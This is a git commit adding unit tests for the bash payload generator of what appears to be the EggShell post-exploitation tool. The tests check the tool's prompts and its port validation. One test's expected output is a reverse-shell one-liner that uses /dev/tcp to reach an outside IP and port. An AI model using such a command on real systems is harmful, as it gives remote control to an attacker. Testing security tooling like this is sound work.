32e55a46cc8085b57d5ed3dce7bb92f33e4cc957
Zander Work <zander@zanderwork.com>
2019-02-05 22:00:42 -0800

    added more payload tests (#6)

--- test/test_payload.py
+++ test/test_payload.py
@@ -42,3 +42,43 @@ class TestPayload(unittest.TestCase):
     def test_teensy_properties(self):
         print "== Testing teensy properties =="
         self.assertTrue(self.tp.name == "Teensy macOS")
+    
+    def test_bash_generation(self):
+        # make a bash payload
+        self.eggshell_proc.sendline("1")
+
+        # set lhost
+        self.eggshell_proc.sendline("199.199.199.253")
+
+        # set lport
+        self.eggshell_proc.sendline("9999")
+
+        # get output
+        self.eggshell_proc.recvuntil("LPORT = ")
+        self.eggshell_proc.recvuntil("----------------------------------------")
+        self.eggshell_proc.recvline()
+        payload = self.eggshell_proc.recvline()[7:-5]
+        
+        # expected output (this is our baseline)
+        expected_out = "bash &> /dev/tcp/199.199.199.253/9999 0>&1"
+
+        print "== Testing bash payload args =="
+        self.assertTrue(expected_out == payload)
+        print "== Bash payload args good =="
+
+    def test_bash_bad_port(self):
+        # make a bash payload
+        self.eggshell_proc.sendline("1")
+
+        # default lhost
+        self.eggshell_proc.sendline("")
+
+        # invalid port (has to be >=1024)
+        self.eggshell_proc.sendline("42")
+
+        out = self.eggshell_proc.recvall(timeout=0.5)
+        expected = "invalid port, please enter a value >= 1024"
+
+        print "== Testing reprompt for payload port =="
+        self.assertTrue(expected in out)
+        print "== Reprompt for port good =="
